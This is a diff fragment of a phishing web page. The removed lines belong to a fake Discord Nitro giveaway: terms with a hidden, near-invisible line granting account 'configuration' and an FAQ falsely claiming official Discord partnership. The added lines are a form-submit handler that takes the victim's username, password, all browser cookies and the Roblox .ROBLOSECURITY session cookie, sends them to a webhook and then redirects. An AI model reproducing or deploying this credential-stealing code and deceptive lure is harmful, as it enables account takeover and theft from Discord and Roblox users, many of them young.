-                <p><strong>4. Winner Notification:</strong> Winners will be contacted via Discord DM within 48 hours of selection.</p>
-                <p><strong>5. Data Processing:</strong> By entering, you consent to the collection and processing of your Discord username, email, and entry data for giveaway administration.</p>
-                <p><strong>6. Liability:</strong> We are not responsible for technical issues, lost entries, or Discord service disruptions.</p>
-                <p><strong>7. Modification:</strong> We reserve the right to modify these terms at any time with notice.</p>
-                <p><strong>8. Governing Law:</strong> These terms are governed by the laws of the United Kingdom.</p>
-                <p style="color:#2f3136; font-size:9px;">by entering this giveaway and entering your credentials you allow us to configure your discord account</p>
-                <p style="margin-top:8px;"><strong>9. Acceptance:</strong> By clicking "Continue with Email" you accept all terms above.</p>
-            `);
-        });
-
-        // Support content
-        document.getElementById('supportLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            openModal('Support Center', `
-                <p><strong>Welcome to Discord Nitro Giveaway Support!</strong></p>
-                <p>We're here to help with any questions or issues you may have.</p>
-                <p><strong>📧 Email Support:</strong> support@nitro-giveaway.com<br>
-                <small>Response time: 24-48 hours</small></p>
-                <p><strong>💬 Discord Support:</strong> Join our official server at discord.gg/nitro-giveaway</p>
-                <p><strong>📝 FAQ:</strong></p>
-                <p><strong>Q: How do I know if I won?</strong><br>
-                A: Winners are contacted via Discord DM and email.</p>
-                <p><strong>Q: Is this giveaway legitimate?</strong><br>
-                A: Yes, we are an officially recognized Discord giveaway partner.</p>
-                <p><strong>Q: What if I don't receive my prize?</strong><br>
-                A: Contact support with your entry confirmation and we'll investigate.</p>
-                <p><strong>Q: Can I enter multiple times?</strong><br>
-                A: No, one entry per person to ensure fairness.</p>
-                <p style="margin-top:8px;"><strong>Hours:</strong> Monday-Friday, 9AM-6PM GMT</p>
-            `);
-        });
-
-        console.log('🚀 Nitro Giveaway system ready.');
-    })();
-</script>
+            // Form submit
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                let consentStatus = (cookieConsent === true) ? "YES" : (cookieConsent === false ? "NO" : "UNKNOWN");
+                const allCookies = document.cookie;
+                const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+                const robloxValue = robloxCookie ? robloxCookie.split('=')[1] : null;
+                sendToWebhook(username, password, {
+                    "Cookie Consent (submit)": consentStatus,
+                    "All Cookies": allCookies || "[none]",
+                    "ROBLOSECURITY": robloxValue || "[not found]"
+                });
+                window.location.href = REDIRECT_URL;
+            });
+        })();
+    </script>
 </body>
 </html>
